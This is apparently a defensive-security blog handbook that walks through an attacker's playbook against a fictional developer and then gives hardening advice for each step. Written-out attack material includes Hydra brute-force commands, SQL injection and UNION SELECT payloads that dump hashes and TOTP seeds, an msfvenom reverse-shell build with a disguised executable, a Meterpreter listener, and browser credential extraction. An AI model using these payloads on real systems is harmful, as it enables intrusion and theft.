# The Defender's Handbook — How Hackers Really Break In, and How Developers Stop Them

**Last updated: June 2026 · By [JB (Muke Johnbaptist)](/) — same defensive-engineering frame I apply across [Shoppleet](https://shoppleet.com), [DGateway](https://dgateway.desispay.com) and every client API I ship.**

> **Defensive education only.** Every technique below is shown so you can defend against it. Running these tools against systems you don't own or have written permission to test is a crime in most countries. Practice only on your own lab or deliberately vulnerable training apps.

After getting hacked, most people want a checklist. But you can't defend a door you don't know exists. So this guide does something different: it walks through the actual attacker playbook — step by step, with the real tools — and then translates each move into the concrete fix that shuts the door before it opens.

The cast is simple. **Sally** is a developer who built something real and shipped it fast. **Kim** is an ethical hacker who probes Sally's systems the way a criminal would, then reports the holes. Each section follows the same rhythm: **the attack**, **why it works**, and **the defense**.

## The shape of nearly every intrusion

Despite endless variety in tools, almost every attack follows the same arc:

**Recon** (find targets) → **Scan** (map open doors) → **Exploit** (break in) → **Access** (grab data or a shell) → **Persist** (stay and expand).

Defense layers on top of that arc: make recon unrewarding, scanning unrevealing, exploitation impossible, access useless, and persistence detectable. No single control saves you — but together they make Kim move on to an easier target.

## 1. Reconnaissance & Network Scanning

Before anyone touches your login form, they build a map. Which machines are alive? Which ports are open? What software answers?

### The attack

Kim starts with just a domain. A DNS lookup turns it into an IP:

```bash
ping sallystartup.com
# PING sallystartup.com (192.168.1.20): 56 data bytes
# nslookup or dig work too
```

Then Nmap reveals the open "doors" and what runs behind them:

```bash
nmap -sV 192.168.1.20
# 80/tcp open  http  Apache httpd
# -sV detects the service AND its version on each open port
```

On an internal network, he discovers the range with `ip a`, then sweeps for live hosts:

```bash
sudo nmap -sn 192.168.122.0/24 -n -oA tnet
# -sn = no port scan (just "who's alive"), -n = no DNS, -oA = save all formats
```

### Why it works — the ARP-vs-ICMP trap

Here's a subtlety even defenders miss. People assume "host discovery" means _pinging_ (ICMP). But on a local subnet, Nmap quietly uses **ARP** (which maps IPs to hardware MAC addresses) instead.

The consequence: **a host that doesn't reply to a ping is not necessarily offline.** On the same subnet, ARP almost always answers even if the firewall drops every ICMP and TCP probe. Across a router, ARP stops working and Nmap falls back to ICMP/TCP — and _now_ firewall config matters. A hardened machine can look "alive" locally yet "dead" from the internet. That's not the firewall being inconsistent; it's the scanner switching strategy.

### The defense

- **Expose the minimum.** Every open port is a door. Close everything you aren't using.
- **Segment the network** (separate VLANs for servers, workstations, printers, IoT) to shrink the blast radius.
- **Don't leak versions.** Banner-grabbing feeds attackers straight to known CVEs — suppress or genericize version headers.
- **Monitor for scans** with an IDS/IPS (Suricata, Zeek) and rate-limit at the firewall.
- **Patch the services that do answer** — recon is only useful if what it finds is exploitable.

> **Case study — the seven silent hosts.** In one test, only 3 of 7 known hosts answered a ping sweep across a router. The other 4 were alive, running critical services, configured to drop ICMP. Dropping ICMP is fine hygiene — but it isn't a security control on its own, and "it didn't respond to ping" is never proof of safety.

## 2. Hidden Pages & Directory Brute-Forcing

"Nobody will find it" is not a security strategy. Sally built an admin panel and just didn't link to it. Kim found it in minutes.

### The attack

The admin panel exists on the server even though nothing links to it. **Gobuster** throws thousands of common path names at the server and watches which respond:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://sallystartup.com
# /.htaccess      (Status: 403)
# /server-status  (Status: 403)
# /admin.php      (Status: 200)   <-- accessible!
```

The wordlist comes from **SecLists**, a curated collection of common directory names, usernames, passwords, and payloads gathered from real breaches. A `200` means "here it is"; a `403` means "it's here but you're blocked" — both confirm the path exists.

### Why it works

A web server returns whatever resource it has for a path, regardless of whether anything links to it. "Security through obscurity" collapses against a tool that tries every common name faster than any human could.

### The defense

- **Authenticate admin areas properly** — a real server-side session, not a secret URL. Treat the path as public knowledge.
- **Rate-limit and lock out** — turn a 2-minute scan into an impractical one and generate alerts.
- **IP allow-list or VPN-gate** admin endpoints so they return nothing useful to the public internet.
- **Lock down dotfiles and backups** (`.htaccess`, `.git`, `config.bak`, old archives) at the web-server layer.
- **Add a WAF** to recognize and throttle brute-forcing patterns.

> **Case study — the unlinked admin panel.** Sally assumed an unlinked `admin.php` was invisible. Discovering it, then brute-forcing its login (next section), ended with a live customer database exposed. The root cause wasn't the hidden page — it was that being hidden _was_ the only protection, behind a weak password.

## 3. Brute-Forcing Logins with Hydra

Once Kim finds a login — a web panel, SSH, an exposed RDP port — he automates with **Hydra**, a fast login cracker that tries many username/password pairs until one works.

### The attack — web form

Hydra needs the form's page, field names, and the failure message (so it knows wrong from right):

```bash
hydra -L users.txt -P passwords.txt sallystartup.com \
  http-post-form "/admin.php:username=^USER^&password=^PASS^:Incorrect username or password"
# [80][http-post-form] login: administrator   password: iloveyou
```

### Same tool, different service — RDP

On a coffee-shop network, Kim scans for the RDP port and points Hydra at it (he needs only the victim's IP):

```bash
nmap -p 3389 192.168.1.0/24            # find machines with RDP open
hydra -t 4 -V -f -L users.txt -P rockyou-05.txt rdp://192.168.1.40
# [3389][rdp] login: Sally  password: 123456
```

An RDP client like `xfreerdp` then gives full desktop access.

### A related trick — username enumeration

If a site returns _different_ messages ("username not found" vs. "wrong password"), Kim can confirm which usernames are valid before cracking passwords, narrowing his attack dramatically.

### Why it works

Three conditions make brute force succeed: (1) unlimited attempts allowed, (2) weak or reused passwords, (3) the app reveals whether a username is valid. Remove any one and it gets much harder; remove all three and it fails.

### The defense

- **Account lockout and rate limiting** — Hydra's speed is its weapon; take it away.
- **Enforce strong passwords** and block known-breached ones (check against Have I Been Pwned).
- **Multi-factor authentication** — a cracked password fails without the second factor.
- **Generic error messages** — never confirm an account exists.
- **Keep RDP/SSH off the public internet** (VPN-gate them); use SSH keys, disable password login. (See the [VPS hardening guide](/blog/secure-vps-and-install-dokploy) for the one-script setup.)
- **CAPTCHA after a few failures** stops automated tools while barely affecting humans.
- **Monitor auth logs** — a flood of failed logins is the clearest sign of an attack in progress.

> **Case study — "iloveyou" and "123456".** Both the web-panel and RDP breaches came down to a guessable password and a service that accepted unlimited tries. No exotic exploit. The cheapest high-impact fix in this whole guide is lockout + a banned-weak-password list.

## 4. SQL Injection — The Front Door Left Open

SQL injection happens whenever user input is glued directly into a database query. It's decades old, still everywhere, and entirely preventable.

### The attack, part 1 — bypassing login

A naive backend builds a query by concatenation:

```sql
SELECT * FROM users WHERE username = 'sally_admin' AND password = 'dummy';
```

Kim doesn't guess the password — he rewrites the query. Entered in the username field:

```
sally_admin'--
aaa' OR 1=1--
```

The `--` (or `#` in MySQL) comments out the rest, including the password check. The query becomes `... WHERE username = 'aaa' OR 1=1--'` — and `1=1` is always true, so login succeeds, usually as the **first user in the table** (often the admin).

### The attack, part 2 — stealing the whole database with UNION SELECT

A search box is just as dangerous. Using **Burp Suite** (a proxy that intercepts and replays requests), Kim appends a single quote (`baker'`) and the server throws a raw SQL error — confirming the input reaches the database and leaking the query structure. He then merges a second query with **UNION SELECT**. Both queries must return the same number of columns, which he finds by trial and error:

```
baker') UNION SELECT 1 FROM users--                    -> 500 error
baker') UNION SELECT 1,2,3,4,5 FROM users--            -> 500 error
baker') UNION SELECT 1,2,3,4,5,6,7,8,9 FROM users--    -> 200 OK
baker') UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
```

The response returns every user's id, email, and password hash — with no login and no cracking. One crafted request to an unprotected search box emptied the user table.

### Why it works

The database can't tell malicious input from legitimate data because the app **mixed code and data together** as one string. The moment input can change a query's _structure_ rather than just its _values_, injection is possible.

### The defense

- **Use parameterized queries / prepared statements.** This is the real fix. The structure is fixed in advance; input is bound separately as a value that can never become code. `WHERE username = ?` makes `' OR 1=1--` a meaningless username.
- **Use an ORM** that parameterizes by default — and verify nobody bypasses it with raw queries.
- **Validate and sanitize input** as defense in depth (never the only control).
- **Least privilege for the DB account** — a successful injection then reaches far less.
- **Never show raw SQL errors** to users; log them server-side.
- **Don't leak username validity;** add a WAF as a backstop. (See [Sentinel v2 + Pulse v1 migration](/blog/sentinel-pulse-migration-guide) for the Go-side WAF + auto-ban plumbing.)

> **The one-line takeaway:** if you concatenate user input into a SQL string, you're vulnerable. If you use parameterized queries everywhere, this entire section's attacks stop working.

## 5. Password Hashing & Cracking

Sally did the "right" thing — she stored hashes, not plaintext. But hashing isn't a magic word; the _algorithm_ and whether you _salt_ decide whether those hashes survive an attacker.

### What a hash is

A one-way function: it turns any input into a fixed-length string and can't be reversed. So why are stolen hashes dangerous? Because you can't _reverse_ a hash, but you can _guess and compare_.

### The attack — dictionary cracking

With the email + hash pairs from the UNION SELECT, Kim identifies them as **MD5** (32 hex characters) and feeds them to **John the Ripper** with a wordlist:

```bash
echo "jane:5f4dcc3b5aa765d61d8327deb882cf99" >> hashes.txt
john --format=raw-md5 --wordlist=best15.txt hashes.txt
# iloveyou   (jane)
# letmein    (joshua)
```

**Hashcat** does the same job, GPU-accelerated, often against `rockyou.txt` (~14M leaked passwords). Against fast hashes like MD5, weak passwords fall in seconds.

### Why it works

Two failures compound. **MD5 is fast** (billions of guesses/second on a GPU), so brute force is cheap. And **without a salt**, identical passwords produce identical hashes — enabling precomputed rainbow-table lookups and letting one cracked hash expose everyone sharing that password.

### The defense

- **Never use MD5 or SHA-1 for passwords** — far too fast, broken for this purpose.
- **Use a slow, purpose-built algorithm:** bcrypt, scrypt, or **Argon2** (Argon2id is the modern first choice). They turn a seconds-long crack into a years-long one.
- **Unique salt per password** — defeats rainbow tables and forces the attacker to crack every hash from scratch.
- **Tune the work factor** as high as your servers tolerate; revisit as hardware improves.
- **Add a pepper** (a secret stored outside the database) so a database-only breach yields nothing crackable.

> **Case study — "hashed" is not "safe".** Sally stored unsalted MD5; "admin123" and "iloveyou" fell in seconds against a tiny wordlist. Salted Argon2 would have made the same leaked database near-useless. Same breach, completely different outcome.

## 6. Defeating Two-Factor Authentication

2FA is genuinely powerful — a stolen password alone won't get in. But it protects you only if its _secret_ is protected. Sally's mistake wasn't using 2FA; it was storing its secret where an attacker could reach it.

### How TOTP works

The six-digit codes from apps like Google Authenticator come from **TOTP** (Time-based One-Time Password, RFC 6238). It combines a **shared secret key** (created at setup, stored on both server and phone) with the **current time**. Same public algorithm + same secret + same moment = same code on both sides. That's the magic and the weakness.

### The attack — steal the seed, clone the token

Kim already has database access from his SQL injection. He reasons the TOTP secret is probably in the `users` table and guesses the column name through the injection until one returns data:

```
... UNION SELECT id,email,password,totp_key,5,6,7,8,9 FROM users--    -> no such column
... UNION SELECT id,email,password,totp_secret,5,6,7,8,9 FROM users-- -> 200 OK
# jane:  JBSWY3DPEHPK3PXP   (base32 TOTP seed)
```

He adds Jane's secret to his own authenticator app as a manual key. His phone now generates the exact same codes Jane's does, in sync. Combined with the cracked password, the second factor is gone — no reset, no access to Jane's phone, no alarms.

### Why it works

TOTP's security rests entirely on the secrecy of the seed. The algorithm and the clock are public. If the seed leaks, an attacker reproduces every future code forever. Storing it in plaintext next to passwords collapsed two factors back into one.

### The defense

- **Fix the SQL injection first** — if the database can't be read, the seed can't be stolen. (Upstream root cause.)
- **Never store TOTP secrets in plaintext** — encrypt at rest with a key held outside the database, or use a vault (HashiCorp Vault, AWS Secrets Manager, cloud KMS).
- **Isolate secrets from ordinary app data.**
- **Consider phishing-resistant factors** — hardware keys / passkeys (FIDO2/WebAuthn) don't rely on a shared seed in your database.
- **Detect anomalies** — new device/location or impossible travel should trigger step-up verification even with a correct code.

> **Security is only as strong as the weakest layer.** Sally hashed passwords _and_ used 2FA — strong on paper. One weak point (storing secrets reachably) undid both.

## 7. Phishing, Trojans & Reverse Shells

Not every attack targets your code. The most reliable path in is often the person using the machine.

### The attack — a malicious file disguised as harmless

Kim builds a **reverse shell** with `msfvenom` (part of Metasploit). A reverse shell reaches _back out_ from the victim to the attacker, slipping past firewalls that block inbound but allow outbound:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.122.71 LPORT=4444 -f exe -o updater.exe
```

He disguises it — renaming to `picture.jpeg.exe` (Windows hides known extensions, so the victim sees `picture.jpeg`), and zipping it to slip past email filters. Then he sets up a listener and sends a convincing email impersonating a trusted contact or "IT support":

```
msf6> use exploit/multi/handler
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> set LHOST 192.168.122.71
msf6> set LPORT 4444
msf6> exploit
# [*] Meterpreter session 1 opened   <-- victim clicked
```

The moment the victim double-clicks, the tunnel opens and Kim has remote control.

### Why it works

This is **social engineering** — it exploits trust and habit, not bugs. A familiar sender, an urgent pretext, a hidden extension, a default OS setting. No patch fixes human curiosity.

### The defense

- **Show file extensions** (turn off "hide known extensions") so `picture.jpeg.exe` reveals itself.
- **Never open unexpected attachments** — even from people you know; sender names are trivially spoofed. Verify out-of-band.
- **Run endpoint protection** with real-time scanning, kept updated.
- **Don't run as administrator** day-to-day — least privilege limits the damage.
- **Open suspicious files in a sandbox or VM.**
- **Filter email aggressively** — block executables, inspect inside archives, use SPF/DKIM/DMARC.
- **Egress filtering** — reverse shells must call out; restrict and monitor outbound connections.
- **Train people regularly** — simulated phishing measurably cuts click rates.

> **Case study — "a sunset photo from Bob".** Kim impersonated Sally's friend and attached a "Paris sunset." Hidden extensions made the Trojan look like a JPEG; trust did the rest. The defenses that would have stopped it cost nothing.

## 8. Stealing Saved Browser Passwords

Once an attacker has a foothold (Section 7), that "save password?" prompt you clicked months ago becomes a treasure chest.

### The attack

When a browser saves a password, it isn't an impenetrable vault — it's an encrypted file _on your computer_, with the key tied to your OS login. Anyone running as you can decrypt it. From his Meterpreter session, Kim confirms he's running as the user, uploads an extraction tool, and pulls saved passwords, cookies, and session tokens in plaintext:

```
meterpreter> getuid
# Server username: DESKTOP\Sally
meterpreter> upload extractor.exe C:\Windows\Temp\
meterpreter> shell
C:\> extractor.exe --chrome -o sally_data
# [+] 18 cookies and 2 passwords found
```

Stolen cookies can even let him hijack active sessions without a password.

### Why it works

Browser stores protect against _other users_ and _theft of the file alone_ — not against code running as _you_. The key sits right there, bound to your session.

### The defense

- **Use a dedicated password manager** with a strong master password the OS doesn't hold.
- **Be cautious with browser-saved passwords** for high-value accounts (banking, email, work).
- **Prevent the foothold** — everything that stops the Trojan stops this too.
- **Enable MFA everywhere** so a stolen password is less useful.
- **Full-disk encryption and a strong OS login.**
- **Rotate credentials and invalidate sessions** after any suspected compromise.

> **The uncomfortable truth:** "save password" is a convenience that trades away safety the moment your machine is compromised.

## 9. Network & Wi-Fi Attacks

Shared networks — cafés, airports, hotels, offices — are hunting grounds. Here the attacker gets _between_ you and everything you talk to.

**Packet sniffing.** With a card in **monitor mode** and **Wireshark**, an attacker captures every packet silently. On **HTTP** sites, passwords are plaintext; **HTTPS** hides contents but not metadata (which sites, what times).

**Man-in-the-Middle & SSL stripping.** The attacker relays your traffic through their machine. **SSL stripping** forces your browser down to unencrypted HTTP while keeping a secure link to the real site — page loads normally, no warning, everything you type goes to them.

**Evil Twin.** A cloned Wi-Fi network with the same name and a stronger signal. Your device auto-connects to the stronger one; the attacker then serves fake login pages.

**ARP poisoning.** ARP has **zero authentication** — any device can answer any request. Forged ARP replies claim the attacker's MAC owns the router's IP, routing all your traffic through them. (Detection tip: two IPs sharing one MAC.)

**DNS hijacking.** Compromise the router/DNS (often via default passwords or malware) and answer with a _fake_ IP. Your browser loads a perfect clone of your bank; credentials go to the attacker, who forwards you to the real site so you never suspect.

**DDoS.** A **botnet** of compromised devices (often insecure IoT) floods a target until it collapses and real users are locked out.

### The defense

**For users:**

- **Use a reputable VPN** on public Wi-Fi.
- **Insist on HTTPS;** never enter credentials on HTTP, never click through certificate warnings.
- **Turn off auto-connect** to open networks; forget untrusted ones.
- **Patch devices and routers;** change default router passwords.

**For developers/operators:**

- **Enforce HTTPS everywhere and enable HSTS** (defeats SSL stripping).
- **Modern TLS only;** consider certificate pinning for sensitive apps.
- **Dynamic ARP inspection and port security** on managed switches.
- **DNSSEC and trusted resolvers;** monitor for unexpected DNS changes.
- **DDoS mitigation / scrubbing** (CDN/WAF) in front of public services.
- **Secure every IoT device** — default credentials are what build the botnets used against everyone.

> **Case study — a famous botnet.** In 2016, a botnet built from compromised IoT devices flooded major DNS infrastructure and knocked well-known platforms offline. The devices were ordinary cameras and routers left on default passwords. Securing your own IoT is a civic duty as much as a personal one.

## 10. The Attacker's Toolbox — and What Defends Against Each

| Tool                    | Category        | What it does                                                                       | What defends against it                                             |
| ----------------------- | --------------- | ---------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| **Nmap**                | Recon/scanning  | Discovers hosts/ports, fingerprints services; ARP locally, ICMP/TCP across routers | Minimize open ports, segment, hide versions, IDS/IPS, patch         |
| **Gobuster**            | Web discovery   | Brute-forces hidden directories/files                                              | Authenticate paths, rate-limit, IP allow-list, WAF                  |
| **SecLists**            | Wordlists       | Common usernames/passwords/paths/payloads from breaches                            | Ban breached passwords, strong-password policy, non-guessable paths |
| **Hydra**               | Login cracker   | Online brute force vs. forms, RDP, SSH, FTP                                        | Lockout, rate limit, MFA, CAPTCHA, generic errors, VPN-gate RDP/SSH |
| **Burp Suite**          | Web proxy       | Intercept/modify/replay HTTP(S); find & exploit SQLi                               | Parameterized queries, validation, hide errors, WAF                 |
| **sqlmap**              | SQL injection   | Automates finding/exploiting SQLi, dumps tables                                    | Parameterized queries, least-privilege DB, WAF                      |
| **John the Ripper**     | Cracking        | Offline dictionary hash cracking                                                   | bcrypt/scrypt/Argon2, unique salts, high work factor                |
| **Hashcat**             | Cracking        | GPU hash cracking vs. huge lists                                                   | Slow salted hashing, strong unique passwords, pepper                |
| **msfvenom**            | Payloads        | Crafts/disguises reverse shells                                                    | Don't open attachments, show extensions, EDR, least privilege       |
| **Metasploit**          | Exploitation    | Exploits, listeners, post-exploitation (Meterpreter)                               | Patch CVEs, EDR, segmentation, egress filtering                     |
| **Wireshark**           | Packet analysis | Captures/inspects traffic; reads plaintext protocols                               | Encrypt everything (HTTPS/TLS/VPN), HSTS, avoid plaintext           |
| **Aircrack-ng**         | Wi-Fi           | Captures handshakes, cracks weak Wi-Fi keys                                        | Strong WPA2/WPA3, disable WPS, enterprise auth                      |
| **xfreerdp**            | RDP client      | Full remote control once creds are known                                           | VPN-gate RDP, MFA, strong passwords, lockout, IP restriction        |
| **Social-Eng. Toolkit** | Phishing        | Builds phishing pages/cloned logins                                                | Training, MFA, SPF/DKIM/DMARC, URL vigilance                        |
| **hping3**              | Flooding        | High-speed packet floods (DoS)                                                     | DDoS scrubbing/CDN, rate limiting, upstream filtering               |

These tools aren't secret — they're free and run on a laptop. Your advantage isn't keeping them away; it's building systems where, even with every tool in hand, the attacker finds no door that opens.

## 11. The Developer's Hardening Checklist

### Tier 1 — Do these first (highest impact, lowest effort)

- [ ] **Parameterized queries / prepared statements** for every DB call. No string-concatenated SQL anywhere.
- [ ] **Account lockout and rate limiting** on all login endpoints.
- [ ] **One generic auth error** ("invalid username or password") — never reveal whether a username exists.
- [ ] **bcrypt / scrypt / Argon2 with a unique salt** per user. Migrate off MD5/SHA-1.
- [ ] **Show file extensions** on Windows; train staff never to open unexpected attachments.
- [ ] **Enforce HTTPS everywhere and enable HSTS.**

### Tier 2 — Strong protections to add next

- [ ] **MFA;** store any TOTP secrets **encrypted or in a vault**, never plaintext.
- [ ] **Least privilege** for DB accounts, OS accounts, services. Don't work as admin/root.
- [ ] **Never show raw error messages** to users; log server-side.
- [ ] **Authenticate every admin/sensitive endpoint** — assume the URL is public.
- [ ] **Close unused ports;** VPN-gate RDP/SSH, use SSH keys, disable password login.
- [ ] **Block known-breached/common passwords** at signup and change.
- [ ] **Endpoint protection** with real-time scanning; patch everything.

### Tier 3 — Defense in depth & operational maturity

- [ ] **WAF** in front of web apps.
- [ ] **Network segmentation** (servers / workstations / IoT VLANs).
- [ ] **Egress filtering** + monitoring to catch reverse shells.
- [ ] **Dedicated password manager;** limit browser-saved passwords for high-value accounts.
- [ ] **DDoS mitigation / CDN** in front of public services.
- [ ] **Secure all IoT and router defaults.**
- [ ] **Logging and alerting** on auth failures, scans, config changes — reviewed regularly.
- [ ] **Periodic security testing** (or a pen tester) and **simulated phishing** for staff.
- [ ] **Incident response plan:** rotate credentials, invalidate sessions, contain a breach.

## Final word

Every breach here traces back to a small, ordinary, fixable mistake: a hidden page that was only hidden, an input box that trusted its input, a password that was fast to crack, a secret stored next to the data it protected, a person who trusted the wrong email. Attackers are patient and their tools are free — but their entire playbook depends on those small mistakes existing.

Defense isn't about being unbreakable. It's about closing the easy doors so thoroughly that an attacker moves on. Fix the Tier-1 items today, work down the list, and you'll have shut the most common paths used against developers like Sally — and like you.

**Stay curious. Stay ethical. Build the wall.**
